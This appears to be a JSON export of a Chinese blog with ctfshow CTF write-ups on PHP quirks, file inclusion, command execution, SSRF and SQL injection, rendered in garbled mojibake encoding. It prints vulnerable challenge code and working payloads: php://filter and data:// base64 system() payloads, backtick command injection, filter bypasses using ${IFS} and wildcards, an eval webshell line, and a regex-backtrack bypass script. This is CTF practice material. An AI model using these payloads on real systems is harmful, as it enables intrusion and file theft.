æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ã€‚ ä¸€ä¸ªç®€å•çš„æ–¹æ³•å°±æ˜¯è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œåœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå†™ä¸ªä¸€å¥è¯ï¼Œç„¶åä¿å­˜ä¸ºtxtæ–‡æ¡£ã€‚ ä¾‹å¦‚ f=http://url/xxx.txt?ctfshow å…¶ä¸­xxx.txtä¸ºä¸€å¥è¯ è¦æ˜¯æ²¡æœ‰æœåŠ¡å™¨çš„è¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨phpä¼ªåè®®ç»•è¿‡ payload:f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php filterä¼ªåè®®æ”¯æŒå¤šç§ç¼–ç æ–¹å¼ï¼Œæ— æ•ˆçš„å°±è¢«å¿½ç•¥æ‰äº†ã€‚ /ctfshow/../../../../var/www/html/flag.php 130-131 error_reporting(0); highlight_file(__FILE__); include(&quot;flag.php&quot;); if(isset($_POST[&#39;f&#39;])){ $f = $_POST[&#39;f&#39;]; if(preg_match(&#39;/.+?ctfshow/is&#39;, $f)){ die(&#39;bye!&#39;); } if(stripos($f, &#39;ctfshow&#39;) === FALSE){ die(&#39;bye!!&#39;); } echo $flag; } ç»•è¿‡preg_match f[]=1ctfshow å½“ç„¶çœ‹å¸ˆå‚…ä»¬çš„åšå®¢è¯´çš„é¢„æœŸè§£æ˜¯è¿™æ ·çš„ï¼š è€ƒå¯Ÿç‚¹ï¼šåˆ©ç”¨æ­£åˆ™æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡ https://www.laruence.com/2010/06/08/1579.html https://www.freebuf.com/articles/web/190794.html PHP ä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™ pcre è®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ pcre.backtrack_limit å›æº¯æ¬¡æ•°ä¸Šé™é»˜è®¤æ˜¯ 100 ä¸‡ã€‚å¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡äº† 100 ä¸‡ï¼Œpreg_match å°†ä¸å†è¿”å›é 1 å’Œ 0ï¼Œè€Œæ˜¯ falseã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡ç¬¬ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼äº†ã€‚ pythonè„šæœ¬å¦‚ä¸‹ import requests url=&quot;http://03771c3c-6afb-4457-a719-19cc6ccf922e.chall.ctf.show/&quot; data={ &#39;f&#39;:&#39;very&#39;*250000+&#39;ctfshow&#39; } r=requests.post(url,data=data) print(r.text) 132include(&quot;flag.php&quot;); highlight_file(__FILE__); if(isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;]) &amp;&amp; isset($_GET[&#39;code&#39;])){ $username = (String)$_GET[&#39;username&#39;]; $password = (String)$_GET[&#39;password&#39;]; $code = (String)$_GET[&#39;code&#39;]; if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;){ if($code == &#39;admin&#39;){ echo $flag; } è€ƒå¯Ÿï¼š phpä¸­&amp;&amp;å’Œ||è¿ç®—ç¬¦åº”ç”¨ è®¿é—®/adminï¼Œè·å¾—æºä»£ç  payload username=admin&amp;password=1&amp;code=admin 133if($F = @$_GET[&#39;F&#39;]){ if(!preg_match(&#39;/system|nc|wget|exec|passthru|netcat/i&#39;, $F)){ eval(substr($F,0,6)); }else{ die(&quot;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!&quot;); } } getä¼ å‚ F=`$F `;sleep 3 ç»è¿‡substr($F,0,6)æˆªå–å å¾—åˆ° `$F `; ä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œ eval(&quot;`$F `;&quot;); æˆ‘ä»¬æŠŠåŸæ¥çš„$Få¸¦è¿›å» eval(&quot;``$F `;sleep 3`&quot;); ä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆä¼šæ‰§è¡Œ ` `$F `;sleep 3 ` == shell_exec(&quot;`$F `;sleep 3&quot;); å‰é¢çš„å‘½ä»¤æˆ‘ä»¬ä¸éœ€è¦ç®¡ï¼Œä½†æ˜¯åé¢çš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥è‡ªç”±æ§åˆ¶ã€‚ è¿™æ ·å°±åœ¨æœåŠ¡å™¨ä¸ŠæˆåŠŸæ‰§è¡Œäº† sleep 3 æ‰€ä»¥ æœ€åå°±æ˜¯ä¸€é“æ— å›æ˜¾çš„RCEé¢˜ç›®äº† é“¾æ¥å¥‰ä¸Š: https://blog.csdn.net/qq_46091464/article/details/109095382 134 highlight_file(__FILE__); $key1 = 0; $key2 = 0; if(isset($_GET[&#39;key1&#39;]) || isset($_GET[&#39;key2&#39;]) || isset($_POST[&#39;key1&#39;]) || isset($_POST[&#39;key2&#39;])) { die(&quot;nonononono&quot;); } @parse_str($_SERVER[&#39;QUERY_STRING&#39;]); extract($_POST); if($key1 == &#39;36d&#39; &amp;&amp; $key2 == &#39;36d&#39;) { die(file_get_contents(&#39;flag.php&#39;)); } parse_str() å‡½æ•°æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ã€‚ extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚ ?_POST[key1]=36d&amp;_POST[key2]=36d 135error_reporting(0); highlight_file(__FILE__); //flag.php if($F = @$_GET[&#39;F&#39;]){ if(!preg_match(&#39;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#39;, $F)){ eval(substr($F,0,6)); }else{ die(&quot;å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§&quot;); } } å‘ç°æ²¡æœ‰é™åˆ¶å†™æ–‡ä»¶ payload:F=`$F `;nl f*&gt;xxx 1 ç„¶åå†å»è®¿é—®url/xxxå°±å¯ä»¥å¾—åˆ°flagäº† web136å…¶å®æ˜¯å†135çš„åŸºç¡€ä¸Šå¢åŠ äº†è¿‡æ»¤ &gt;&lt;ä½†æ˜¯linuxä¸­è¿˜å¯ä»¥ç”¨teeå†™æ–‡ä»¶ ls|tee xxx æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹å½“å‰ç›®å½•ä¸‹æœ‰å•¥æ–‡ä»¶ï¼Œè®¿é—®url/xxxå‘ç°åªæœ‰ä¸€ä¸ªindex.phpé‚£æˆ‘ä»¬å†å»çœ‹çœ‹æ ¹ç›®å½•ä¸‹æœ‰ä»€ä¹ˆæ–‡ä»¶ ls /|tee xxx å¾—åˆ° f149_15_h3r3æœ€åç›´æ¥æ‰“å¼€å°±å¯ä»¥äº† nl /f149_15_h3r3|tee xxx 137class ctfshow{ function __wakeup(){ die(â€œprivate classâ€); } static function getFlag(){ echo file_get_contents(â€œflag.phpâ€); }}call_user_func($_POST[â€˜ctfshowâ€™]);","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[{"name":"phpç‰¹æ€§","slug":"phpç‰¹æ€§","permalink":"https://pp1ove.gitee.io/tags/phpç‰¹æ€§/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"ctfshow_æ–‡ä»¶åŒ…å«","slug":"ctfshow-æ–‡ä»¶åŒ…å«","date":"2021-01-27T08:56:29.000Z","updated":"2021-02-06T15:26:37.356Z","comments":true,"path":"2021/01/27/ctfshow-æ–‡ä»¶åŒ…å«/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/27/ctfshow-æ–‡ä»¶åŒ…å«/","excerpt":"","text":"78file=php://filter/read=convert.base64-encode/resource=flag.php 79file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= 80-81 åŒ…å«æ—¥å¿—æ–‡ä»¶æˆ‘ä»¬çš„è¯·æ±‚ä¿å­˜åœ¨äº†æ—¥å¿—ä¸­,è‹¥æˆ‘ä»¬ç”¨includeåŒ…å«æ—¥å¿—åˆ™å¯èƒ½æ‰§è¡Œé‡Œé¢çš„phpè¯­å¥ 82-86 PHP_SESSION_UPLOAD_PROGRESSè¿›è¡Œæ–‡ä»¶åŒ…å«if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); include($file); }else{ highlight_file(__FILE__); } å› ä¸ºä¹‹å‰åœ¨sessionååºåˆ—åŒ–é‡Œé¢å†™è¿‡äº†ï¼Œå°±ä¸ä»‹ç»äº†,è¿™é¢˜å¤šäº†ä¸€ä¸ªæ¡ä»¶ç«äº‰,å¼€ä¸¤ä¸ªburpå°±è¡Œäº† 87 file_put_contenté…åˆåè®®if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; $content = $_POST[&#39;content&#39;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;å¤§ä½¬åˆ«ç§€äº†&#39;);?&gt;&quot;.$content); }else{ highlight_file(__FILE__); } å…ˆä¸Šå›¾ï¼Œ ä¸ºäº†ç»•è¿‡å‰é¢çš„str_replace ,è¿™é‡Œå°†fileè¿›è¡Œä¸¤æ¬¡ç¼–ç  è€Œåé¢çš„contentæ˜¯ä¸å‰é¢çš„phpdieæ‹¼æ¥,&lt;?php die(); ä¸­åˆæ³•çš„base64å­—ç¬¦ä¸²æ˜¯phpdie,è€Œbase64æ˜¯æ¯å››ä¸ªå­—ä¸€ç»„,åˆ™åŠ ä¸¤ä¸ªaa,è®©å‰é¢çš„å…«ä¸ªå­—æ¯ç»„åˆ,ä»è€Œä¸å½±å“æˆ‘ä»¬åé¢çš„ &lt;?php @eval($_POST[a]); è¿˜æœ‰ä¸€äº›ç›¸å…³æ–‡ç« :https://xz.aliyun.com/t/8163#toc-3%20php://filter/write=string.rot13/resource=2.php https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list 88if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; if(preg_match(&quot;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i&quot;, $file)){ die(&quot;error&quot;); } include($file); }else{ highlight_file(__FILE__); } è¿‡æ»¤äº†å¾ˆå¤š,ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤: ä½¿ç”¨ä¼ªåè®® data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"https://pp1ove.gitee.io/tags/æ–‡ä»¶åŒ…å«/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"ctfshow_rce","slug":"ctfshow-rce","date":"2021-01-26T02:57:44.000Z","updated":"2021-03-25T13:10:21.456Z","comments":false,"path":"2021/01/26/ctfshow-rce/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/26/ctfshow-rce/","excerpt":"","text":"ctfshow å‘½ä»¤æ‰§è¡Œ29 è¿‡æ»¤flagæ­£åˆ™è¿‡æ»¤flag,æœ‰å¾ˆå¤šæ–¹æ³•ç»•è¿‡, system(&#39;cat fla\\g.php&#39;); å˜é‡æ‹¼æ¥ fla&#39;&#39;g æ­£åˆ™ç»•è¿‡ f* 30 è¿‡æ»¤systemif(!preg_match(&quot;/flag|system|php/i&quot;, $c)){ eval($c); } systemå‡½æ•°è¿‡æ»¤æ‰äº†å¯ä»¥ä½¿ç”¨echo ; echo%20`fla\\g.p\\hp`; æ­¤å¤–è¿˜æœ‰å¾ˆå¤šå‘½ä»¤æ‰§è¡Œå‡½æ•° system() passthru() exec() shell_exec() popen() proc_open() pcntl_exec() 31 è¿‡æ»¤cat if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#39;/i&quot;, $c)){ eval($c); } catè¢«è¿‡æ»¤,ä½¿ç”¨å…¶ä»–è¯»å–å‡½æ•°more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹ less:ä¸ more ç±»ä¼¼ head:æŸ¥çœ‹å¤´å‡ è¡Œ tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º tail:æŸ¥çœ‹å°¾å‡ è¡Œ nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå· od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹ vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹ vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹ sort:å¯ä»¥æŸ¥çœ‹ uniq:å¯ä»¥æŸ¥çœ‹ file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹ pr: php: sh: ç©ºæ ¼ç»•è¿‡&gt; &lt; &lt;&gt; é‡å®šå‘ç¬¦ %09(éœ€è¦phpç¯å¢ƒ) ${IFS} $IFS$9 {cat,flag.php} //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½ %20 %09 %00-%ff ç®€å•çš„ç»•è¿‡æ­£åˆ™&#39;&#39; \\ * å˜é‡æ‹¼æ¥ 32 è¿‡æ»¤echoå’Œæ‹¬å·if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#39;|\\`|echo|\\;|\\(/i&quot;, $c)){ eval($c); } è¿‡æ»¤äº†echoå’Œæ‹¬å·,æ— æ³•ä½¿ç”¨å‡½æ•°ç»•è¿‡ å¯ä»¥ç»“åˆæ–‡ä»¶åŒ…å«æ¼æ´ä½¿ç”¨ payloadï¼š ?c=include%09$_GET[%22x%22]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=flag.php è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªé—®é¢˜,å°±æ˜¯ä¸èƒ½ä½¿ç”¨;å› ä¸ºåˆ†å·è¢«ban,æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£,å‘ç°å¯ä»¥ä½¿ç”¨?&gt;æ¥ç»“æŸeval() 33if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#39;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c)){ eval($c); } è¿™æ¬¡åŒå¼•å·ä¹Ÿè¢«ban payload ?c=include%09$_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=flag.php 34å¤šè¿‡æ»¤äº†ä¸€ä¸ª: 35å¤šè¿‡æ»¤äº†ä¸€ä¸ª&lt; ,åŒ33 36å¤šè¿‡æ»¤ä¸€ä¸ª æ•°å­— 37ä½¿ç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶ 38åˆè¿‡æ»¤php ï¼Œfile ä½¿ç”¨dataåè®® 39if(isset($_GET[&#39;c&#39;])){ $c = $_GET[&#39;c&#39;]; if(!preg_match(&quot;/flag|php|file/i&quot;, $c)){ include($c.&quot;php&quot;); echo $flag; } }else{ highlight_file(__FILE__); } payload c=data:text/plain,&lt;?php system(&#39;cat f*&#39;)?&gt; è¿™æ ·å°±ç›¸å½“äºæ‰§è¡Œäº†phpè¯­å¥&lt;?php system(&#39;cat f*&#39;)?&gt;.php å› ä¸ºå‰é¢çš„phpè¯­å¥å·²ç»é—­åˆäº†ï¼Œæ‰€ä»¥åé¢çš„.phpä¼šè¢«å½“æˆhtmlé¡µé¢ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œèµ·ä¸åˆ°ä»€ä¹ˆä½œç”¨ã€‚ 40 æ— å‚å‡½æ•°ç»•è¿‡if(isset($_GET[&#39;c&#39;])){ $c = $_GET[&#39;c&#39;]; if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\ï¼ˆ|\\ï¼‰|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\&#39;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } ç¦æ‰äº† \\ä¸èƒ½ç”¨ä¼ªåè®® ç¦æ‰äº† ` ä¸èƒ½ä½¿ç”¨echo ç¦æ‰äº† â€â€œ å’Œ â€˜ â€™ ,[ ] ä¸èƒ½ä½¿ç”¨å¸¦å‚æ•°çš„å‡½æ•°ï¼ˆæ­£åˆ™è¡¨è¾¾å¼é‡Œé¢bançš„æ˜¯ä¸­æ–‡æ‹¬å·ï¼‰ è¿™é‡Œä½¿ç”¨æ— å‚RCE éå†ç›®å½• print_r(scandir(current(localeconv()))); show_source(array_rand(array_flip(scandir(current(localeconv()))))); show_source(next(array_reverse(scandir(current(localeconv()))))); ä¹Ÿå¯ä»¥ä½¿ç”¨ session_id(session_start()),ä½†æ˜¯æ²¡æœ‰æˆåŠŸï¼Œå› ä¸ºsession_idè§„å®šä¸º0-9ï¼Œa-z,A-Z,-ä¸­çš„å­—ç¬¦ 41 æœªè§£å‡º42ä¸43ç›¸åŒ 43 ç»•è¿‡ &gt;/dev/null 2&gt;&amp;1if(isset($_GET[&#39;c&#39;])){ $c=$_GET[&#39;c&#39;]; if(!preg_match(&quot;/\\;|cat/i&quot;, $c)){ system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); } }else{ highlight_file(__FILE__); } è¿™é‡Œæœ‰ä¸€ä¸ª&gt;/dev/null 2&gt;&amp;1 å‚è€ƒé“¾æ¥:https://www.cnblogs.com/ultranms/p/9353157.html æ€»ä¹‹å°±æ˜¯å°†è¾“å‡ºä¸¢å¼ƒ è¿™é‡Œå¯ä»¥åˆ©ç”¨æ¢è¡Œç¬¦ç»•è¿‡,ä¹Ÿå¯ä»¥ä½¿ç”¨|| c=ls%0a c=c\\at flag.php%0a 47åˆè¿‡æ»¤äº†å‡ ä¸ªæŸ¥çœ‹æ–‡ä»¶å‘½ä»¤ nl%09fla?.php%0a 50if(isset($_GET[&#39;c&#39;])){ $c=$_GET[&#39;c&#39;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c)){ system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); } }else{ highlight_file(__FILE__); } nl&lt;&gt;fla\\g.php%0a 52if(isset($_GET[&#39;c&#39;])){ $c=$_GET[&#39;c&#39;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c)){ system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); } }else{ highlight_file(__FILE__); } åˆbanæ‰äº†&lt;&gt; æ¢ä¸€ä¸ªç©ºæ ¼ç»•è¿‡ nl${IFS}fl?g.php%0a 54 /bin/?at ç»•è¿‡if(isset($_GET[&#39;c&#39;])){ $c=$_GET[&#39;c&#39;]; if(!preg_match(&quot;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c)){ system($c); } }else{ highlight_file(__FILE__); } ?c=paste${IFS}fla?.php%0a ?c=/bin/?at${IFS}f?ag.php%0a ?c=/bin/?at${IFS}f?????? è¿™é‡Œè¦æ³¨æ„æœ‰çš„æ—¶å€™å¯èƒ½ä¼šè¢«æ„å¤–æˆªè· æ¯”å¦‚å¦‚æœä½ ç”¨ /bin/?at${IFS}fl??.php%0a é‚£å°±ä¼šè¢«.\\*n.\\*l.*æ ä¸‹ è¿˜æœ‰å¯èƒ½æ˜¯ç¯å¢ƒé—®é¢˜ /bin/past?${IFS}flag.php,åœ¨æœ¬åœ°æ˜¯èƒ½å¤Ÿè¿è¡Œçš„ä½†æ˜¯åœ¨æ­¤é¢˜å½“ä¸­å´å‡ºä¸æ¥ç»“æœ /bin ç›®å½•æ˜¯å­˜æŒ‡ä»¤çš„åœ°æ–¹ 55 è¿‡æ»¤æ‰€æœ‰å°å†™å­—æ¯if(isset($_GET[&#39;c&#39;])){ $c=$_GET[&#39;c&#39;]; if(!preg_match(&quot;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c)){ system($c); } }else{ highlight_file(__FILE__); } è¿‡æ»¤äº†æ‰€æœ‰å°å†™å­—ç¬¦,ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤é€šé…ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨å¸¦æ•°å­—çš„å‘½ä»¤ç»•è¿‡ base64çš„ä½¿ç”¨ æœ‰ä¸ªå‘½ä»¤æ˜¯/bin/base64ï¼Œæˆ‘ä»¬å¯ä»¥æ®æ­¤æ„é€  ?c=/???/????64 ???????? å¾—åˆ° PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMg QERhdGU6ICAgMjAyMC0wOS0wNyAxOTo0MDo1Mw0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhh DQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDcgMTk6NDE6MDANCiMgQGVtYWlsOiBo MXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KDQokZmxh Zz0iZmxhZ3tlYTY0MTJlZi03NGY3LTQ1ZjItYWJiYS05M2Y2ODZkOTkwZDh9Ijs= è§£ç å³å¾—åˆ°flag. bzip2 bzip2 æ˜¯ linux ä¸‹é¢çš„å‹ç¼©æ–‡ä»¶çš„å‘½ä»¤ã€‚åœ¨/usr/bin/bzip2 æ„é€  ?C=/???/???/????2 ???????? ç„¶åè®¿é—®flag.php.bz2ä¸‹è½½å³å¯è·å¾— flag.php 56 è¿‡æ»¤æ‰€æœ‰å¤§å°å†™å­—æ¯+æ•°å­—// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ if(isset($_GET[&#39;c&#39;])){ $c=$_GET[&#39;c&#39;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\\\$|\\(|\\{|\\&#39;|\\&quot;|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c)){ system($c); } }else{ highlight_file(__FILE__); } è¶Šåˆ°åé¢è¶Šç¥ä»™äº†,å…¨éƒ½ä¸ä¼šåš,è¿™é¢˜è¿‡æ»¤äº†å­—æ¯åŠ æ•°å­—,ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤è¿ç®—ç¬¦, å‚è€ƒæ–‡ç« :ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshellï¼š https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html è¿™é‡Œæä¾›ä¸¤ç§æ–¹æ³•: 1.é€šè¿‡ä½è¿ç®—ç¬¦æ„é€ payload 2.åˆ©ç”¨è‡ªå¢è¿ç®—ç¬¦æ„é€ payload ä½†æ˜¯è‡ªå·±åšçš„è¯æˆ‘è§‰å¾—æ˜¯è¦å†™ä¸€ä¸ªpythonè„šæœ¬æ¥ç®—çš„,å°±å…ˆç•™åœ¨è¿™é‡Œ,è¿‡å‡ å¤©æ¥å†™ å°±å…ˆåšåˆ°è¿™é‡Œ,å‰©ä¸‹çš„è¿‡å‡ å¤©å†æ¥åš","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[{"name":"rce","slug":"rce","permalink":"https://pp1ove.gitee.io/tags/rce/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"ssrf","slug":"ssrf","date":"2021-01-24T01:48:04.000Z","updated":"2021-01-31T01:23:07.368Z","comments":false,"path":"2021/01/24/ssrf/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/24/ssrf/","excerpt":"","text":"å¸¸ç”¨åè®®file:/// dict:// sftp:// ldap:// tftp:// gopher:// å‚è€ƒé“¾æ¥:https://www.cnblogs.com/-mo-/p/11673190.html gopheråè®®:https://blog.csdn.net/qq_45089570/article/details/109643457 https://blog.csdn.net/Z_Grant/article/details/102913575?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control https://www.cnblogs.com/flokz/p/11610048.html#autoid-3-0-0 å¼•èµ·SSRFæ¼æ´çš„å‡½æ•°file_get_contents() è·å–æ–‡ä»¶å†…å®¹ fscockopen() æ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnixå¥—æ¥å­—è¿æ¥ curl_exec() æ‰§è¡Œcurlç»˜ç”»,æœ€å¥½ç”¨çš„,å‡ ä¹å¯ä»¥ç”¨æ¥åšå„ç§ssrfæ”»å‡» redisä¸‹è½½redis,ä¿®æ”¹ https://www.evi1s.com/archives/140/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://pp1ove.gitee.io/tags/ssrf/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"sqli-lab","slug":"sqlilabs","date":"2021-01-17T11:33:15.000Z","updated":"2021-02-07T14:09:38.404Z","comments":false,"path":"2021/01/17/sqlilabs/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/17/sqlilabs/","excerpt":"","text":"less 1-4 unionæœªè¿›è¡Œä»»ä½•å¤„ç†,ç›´æ¥unionæ³¨å…¥ less 5-6 ç›²æ³¨,æŠ¥é”™$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#39;; echo &#39;You are in...........&#39;; //æ²¡æœ‰å›æ˜¾,ç›²æ³¨ echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;; print_r(mysql_error()); //è¾“å‡ºæŠ¥é”™ä¿¡æ¯,å¯èƒ½ä¼šäº§ç”ŸæŠ¥é”™æ³¨å…¥ echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &#39;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#39;; } } regexp æ­£åˆ™æ³¨å…¥é™¤äº†å¸¸è§çš„æ—¶é—´ç›²æ³¨,å¸ƒå°”ç›²æ³¨,æ­£åˆ™æ³¨å…¥ä»‹ç»ï¼šhttp://www.cnblogs.com/lcamry/articles/5717442.html likeåŒ¹é…æ³¨å…¥ä¹Ÿå’Œæ­£åˆ™æ³¨å…¥ç±»ä¼¼ less 7 